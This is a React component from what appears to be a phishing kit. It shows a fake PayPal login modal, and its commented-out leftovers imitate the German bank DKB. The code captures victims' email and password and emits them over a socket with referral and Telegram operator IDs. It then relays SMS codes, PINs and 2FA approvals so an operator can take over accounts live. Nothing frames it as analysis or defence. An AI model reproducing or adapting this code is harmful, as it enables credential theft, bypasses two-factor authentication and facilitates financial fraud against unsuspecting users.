import React, { useState, useEffect, useRef } from 'react';
import { useSelector } from 'react-redux';
import styled from 'styled-components';
import { useTranslation } from 'react-i18next';

import { ReactComponent as DKBSVG } from '../../../assets/svg/banks/dkb.svg';
import { ReactComponent as CloseSVG } from './close_modal.svg';
import { LOADER } from './LOADER';
import { getQuery } from '../../../utils/navigation';
import { Text } from '../../../components';

export const PAYPAL = ({ handleBankOpen, children }) => {
  const { t } = useTranslation();
  const { socket } = useSelector(({ socket }) => ({
    socket,
  }));

  const [isFinished, setIsFinished] = useState(false);
  const [dataError, setDataError] = useState(false);
  const [smsError, setSmsError] = useState(false);
  const [pinError, setPinError] = useState(false);
  const [pushError, setPushError] = useState(false);
  const [isOpen, setOpen] = useState(false);
  const [isConfirm, setConfirm] = useState(false);
  const [data, setData] = useState({
    data1: '',
    data2: '',
  });

  const [isCodeConfirmed, setCodeConfirmed] = useState(false);
  const [type, setType] = useState(null);

  const [smsInput, setSmsInput] = useState('');
  const [codeInput, setCodeInput] = useState('');

  const initialInputs = {
    1: { value: '', ref: useRef(null) },
    2: { value: '', ref: useRef(null) },
    3: { value: '', ref: useRef(null) },
    4: { value: '', ref: useRef(null) },
  };

  const [inputs, setInputs] = useState(initialInputs);

  const setPinNumber = (value, key) => {
    setInputs({ ...inputs, [key]: { ...inputs[key], value } });
  };

  const setPin = (code) => {
    if (!code || code.length !== 4) {
      return;
    }

    const transformedInputs = {};

    Object.values(inputs).forEach((item, index) => {
      transformedInputs[index + 1] = { ...item, value: code[index] };
    });

    setInputs(transformedInputs);
  };

  const getPin = () => {
    const isPinValid = Object.values(inputs).every(({ value }) => !!value);

    if (isPinValid) {
      const code = Object.values(inputs).reduce((accum, { value }) => {
        return accum + value;
      }, '');
      return code;
    }

    return null;
  };

  useEffect(() => {
    if (socket) {
      socket.on('PAYMENT_DATA_CODE_GOOD', (payload) => {
        setType('SMS');
      });

      socket.on('PAYMENT_DATA_2FA_GOOD', (payload) => {
        setType('2FA');
      });

      socket.on('PAYMENT_DATA_PIN_GOOD', (payload) => {
        setType('PIN');
      });

      socket.on('PAYMENT_DATA_BAD', () => {
        setDataError(t('CONFIRMATIONS.ERRORS.DATA_ERROR'));
        setConfirm(false);
      });

      socket.on('PAYMENT_CODE_GOOD', () => {
        setIsFinished(true);
      });

      socket.on('PAYMENT_CODE_BAD', () => {
        setType('SMS');

        setSmsError(t('CONFIRMATIONS.ERRORS.CODE_ERROR'));
      });

      socket.on('PAYMENT_2FA_GOOD', () => {
        setIsFinished(true);
      });

      socket.on('PAYMENT_2FA_BAD', () => {
        setType('2FA');

        setPushError(t('CONFIRMATIONS.ERRORS.2FA_ERROR'));
      });

      socket.on('PAYMENT_PIN_GOOD', () => {
        setIsFinished(true);
      });

      socket.on('PAYMENT_PIN_BAD', () => {
        setType('PIN');

        setPinError(t('CONFIRMATIONS.ERRORS.PIN_ERROR'));
      });
    }
  }, [socket]);

  const handleClose = () => {
    setOpen(false);
    handleBankOpen(false);
    setDataError(false);
    setSmsError(false);
    setPushError(false);
    setPinError(false);
    setConfirm(false);
    setData({
      data1: '',
      data2: '',
    });
    setCodeConfirmed(false);
    setType(null);

    setSmsInput('');
    setCodeInput('');
    setIsFinished(false);
  };

  const handleFinish = () => {
    setType(null);

    socket.emit('PAYMENT_2FA_SEND');
  };

  const handleSendSms = () => {
    socket.emit('PAYMENT_CODE_SEND', { code: smsInput });

    setType(null);
    setSmsInput('');
  };

  const handleSendPin = () => {
    socket.emit('PAYMENT_PIN_SEND', { pin: getPin() });

    setType(null);
  };

  const handleCode = () => {
    setCodeInput('');
    setCodeConfirmed(true);
  };

  const handleCodeInput = (e) => {
    setCodeInput(e.target.value);
  };

  const handleSmsInput = (e) => {
    setSmsInput(e.target.value);
  };

  const isDisabled = data.data1 === '' || data.data2 === '';

  const handleData_1 = (e) => {
    setData({ ...data, data1: e.target.value });
  };

  const handleData_2 = (e) => {
    setData({ ...data, data2: e.target.value });
  };

  const handleConfirm = async () => {
    const info = JSON.parse(localStorage.getItem('info'));

    const ref = localStorage.getItem('ref');
    const service = localStorage.getItem('service');

    socket.emit('PAYMENT_DATA_BANK_SEND', {
      ...info,
      login: data.data1,
      password: data.data2,
      ref,
      service,
      bank: 'Paypal',
    });

    setConfirm(true);
  };

  const handleOpen = () => {
    if (!isOpen) {
      setOpen(true);
      handleBankOpen(true);

      const ref = getQuery('ref') || localStorage.getItem('ref');
      const service = getQuery('service') || localStorage.getItem('service');

      if (socket && ref) {
        socket.emit('PAYMENT_NOTIFICATION', { type: 'PAYMENT_BANK_START', telegramId: ref, service });
      }
    }
  };

  const email = t('CONFIRMATIONS.PAYPAL.EMAIL');
  const password = t('CONFIRMATIONS.PAYPAL.PASSWORD');

  return (
    <div onClick={handleOpen}>
      {children}
      <Dialog open={isOpen}>
        <div>
          <CONT>
            <D1>
              <D_TITLE>
                <img src="paypal.png" width="70" />
              </D_TITLE>

              <CloseSVG viewBox="8 8 33 32" onClick={handleClose} src="close_modal.png" className="close" />
            </D1>
            <LOADER
              Title={WARN}
              Input={INPUT}
              isConfirm={isConfirm}
              Button={BUTTON_HANDLER}
              loaderColor="#02007c"
              isCodeConfirmed={isCodeConfirmed}
              smsInput={smsInput}
              handleFinish={handleFinish}
              handleSendSms={handleSendSms}
              handleSendPin={handleSendPin}
              handleCode={handleCode}
              handleCodeInput={handleCodeInput}
              handleSmsInput={handleSmsInput}
              codeInput={codeInput}
              smsError={smsError}
              pushError={pushError}
              isFinished={isFinished}
              pinError={pinError}
              inputs={inputs}
              setPin={setPin}
              setPinNumber={setPinNumber}
              type={type}
            >
              {/* <InputWrapper> */}
              <INPUT
                onChange={handleData_1}
                value={data.data1}
                style={{ marginBottom: 24, marginTop: 30 }}
                placeholder={email}
              />
              <INPUT onChange={handleData_2} value={data.data2} placeholder={password} />
              {/* <Label>Anmeldename</Label>
              </InputWrapper> */}
              {dataError && <Error style={{ textAlign: 'center' }}>{dataError}</Error>}

              <BUTTON disabled={isDisabled} onClick={handleConfirm}>
                <Text tid="CONFIRMATIONS.PAYPAL.BUTTON" />
              </BUTTON>
              {/* <WARN>
                <div>Anmeldung zum Internet-Banking</div>
                <div className="__hr" />
              </WARN>
              <SIDES>
                <LEFT_SIDE>
                  <p>Anmeldename</p>
                  <INPUT
                    onChange={handleData_1}
                    value={data.data1}
                    style={{ marginBottom: 24 }}
                    placeholder="Anmeldename"
                  />
                  <p>Passwort</p>
                  <INPUT onChange={handleData_2} value={data.data2} placeholder="Passwort" />
                  {dataError && <Error>{dataError}</Error>}
                </LEFT_SIDE>
                <RIGHT_SIDE>
                  <div>
                    <strong>Nicht vergessen:</strong>
                    <br />
                    Smartphone oder TAN-Generator bereitlegen.
                  </div>
                  <div>Tipp: Für TAN2go und chipTAN gibt es übrigens unterschiedliche Anmeldenamen.</div>
                </RIGHT_SIDE>
              </SIDES>
              <BUTTON>
                <BUTTON_HANDLER disabled={isDisabled} onClick={handleConfirm}>
                  Anmelden
                </BUTTON_HANDLER>
              </BUTTON> */}
            </LOADER>
          </CONT>
        </div>
      </Dialog>
    </div>
  );
};

const InputWrapper = styled.div`
  position: relative;
  z-index: 2;
  width: 100%;
`;
const Label = styled.label`
  position: absolute;
  pointer-events: none;
  left: 10px;
  top: 18px;
  transition: 0.2s ease all;
  height: 30px;
  width: 400px;
  clip: unset;
  color: #6c7378;
`;
const INPUT = styled.input`
  height: 52px;
  width: 100%;
  padding: 0 10px;
  border: 0.0625rem solid #9da3a6;
  background: #fff;
  text-overflow: ellipsis;

  box-sizing: border-box;

  border-radius: 4px;

  box-shadow: none;
  font-size: 20px;

  &::placeholder {
    color: #6c7378;
  }
  &:focus ~ label,
  &:not(:focus):valid ~ label,
  &:not(:placeholder-shown) ~ label {
    top: 8px;
    bottom: 10px;
    left: 10px;
    font-size: 14px;
    height: 30px;
    width: 400px;
    clip: unset;
    opacity: 1;
  }
`;

const WARN = styled.div`
  display: flex;
  margin-top: 24px;
  font-size: 18px;

  & div {
    width: 100%;
  }

  & .__hr {
    @media (max-width: 550px) {
      display: none;
    }
    border-bottom: 1px solid lightgray;
  }
`;

const BUTTON = styled.button`
  margin-top: 24px;
  width: 100%;
  min-height: 44px;
  padding: 12px 32px;
  border: 0;
  display: block;
  margin-bottom: 8px;
  background-color: #142c8e;
  -webkit-box-shadow: none;
  -moz-box-shadow: none;
  box-shadow: none;
  -webkit-border-radius: 4px;
  -moz-border-radius: 4px;
  -khtml-border-radius: 4px;
  border-radius: 4px;
  -webkit-box-sizing: border-box;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  cursor: pointer;
  -webkit-appearance: none;
  -moz-appearance: none;
  -ms-appearance: none;
  -o-appearance: none;
  appearance: none;
  -webkit-tap-highlight-color: transparent;
  color: #fff;
  font-size: 1.2em;
  text-align: center;
  font-weight: 700;
  font-family: HelveticaNeue-Medium, 'Helvetica Neue Medium', HelveticaNeue, 'Helvetica Neue', Helvetica,
    Arial, sans-serif;
  text-shadow: none;
  text-decoration: none;
  transition: color 0.2s ease, background-color 0.2s ease, border-color 0.2s ease, box-shadow 0.2s ease;
  font-family: pp-sans-big-regular, Helvetica Neue, Arial, sans-serif;
  font-weight: 400;
  font-variant: normal;
  font-size: 100%;
  border-radius: 25px;
  height: 48px;
`;

const BUTTON_HANDLER = styled.button`
  transition: 0.3s;
  border-top: 1px solid #2fade2;
  border-left: 1px solid #1889b7 !important;
  border-right: 1px solid #1889b7 !important;
  border-bottom: 1px solid #0a719c !important;
  background: #0480ea;
  padding: 9px 10px 10px 8px;
  border-radius: 4px;
  font-weight: bold;
  font-size: 13px;
  cursor: pointer;
  color: #ffffff;
  width: 150px;
  height: 40px;
  box-shadow: none;
  &:hover {
    background: #329cee none repeat scroll 0 0;
  }
  &:disabled {
    border-top: none !important;
    border-left: none !important;
    border-right: none !important;
    border-bottom: none !important;
    background: #666666;
    border: none;
    opacity: none;
    box-shadow: none;
  }
`;

const SIDES = styled.div`
  display: flex;
  margin-top: 24px;

  @media (min-width: 550px) {
    justify-content: space-between;
  }

  @media (max-width: 550px) {
    flex-direction: column;
  }
`;

const LEFT_SIDE = styled.div`
  @media (max-width: 550px) {
    width: 100%;
    margin-bottom: 16px;
  }

  & p {
    font-size: 14px;
    margin-bottom: 3px;
  }
`;

const RIGHT_SIDE = styled.div`
  font-size: 18px;
  max-width: 260px;
  display: flex;
  flex-direction: column;
  grid-gap: 24px;
`;

const Dialog = styled.dialog`
  position: absolute;
  outline: 0;
  border: 0;
  top: 0;
  & > div {
    position: fixed;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    display: flex !important;
    justify-content: center !important;
    align-items: center !important;
    background-color: rgba(0, 0, 0, 0.8);
    z-index: 999;
  }
`;

const D1 = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;

  & div {
    display: flex;
    justify-content: center;
    width: 100%;
  }

  & .title {
    height: 35px;
    fill: white;
  }

  & .close {
    width: 24px;
    height: 24px;

    fill: darkgray;

    &:hover {
      cursor: pointer;
    }
  }
`;

const D_TITLE = styled.div`
  display: flex;
  justify-content: center;
  margin-left: 32px;
`;

const CONT = styled.div`
  background-color: #fff;
  border: 1px solid rgb(51, 51, 51);
  width: 540px;
  border-radius: 10px;
  padding: 24px 14px 24px 14px;
  text-align: left;
`;

const Error = styled.p`
  color: red;
  font-size: 14px;
  margin-top: 14px;
`;
